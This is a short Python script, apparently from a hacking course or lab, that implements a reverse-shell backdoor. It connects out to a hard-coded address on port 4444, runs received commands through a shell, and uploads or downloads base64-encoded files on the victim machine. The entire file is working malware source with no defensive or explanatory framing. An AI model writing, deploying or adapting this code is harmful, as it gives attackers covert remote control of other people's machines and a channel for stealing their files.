#!/usr/bin/env python
import os
import socket, json
import subprocess
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
            json_data = b""
            while True:
                try:
                    json_data += self.connection.recv(1024)
                    return json.loads(json_data)
                except ValueError:
                    continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Uploaded successfully".encode()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Chaing working directory to " + path

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1]).encode()
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.65.128", 4444)
my_backdoor.run()
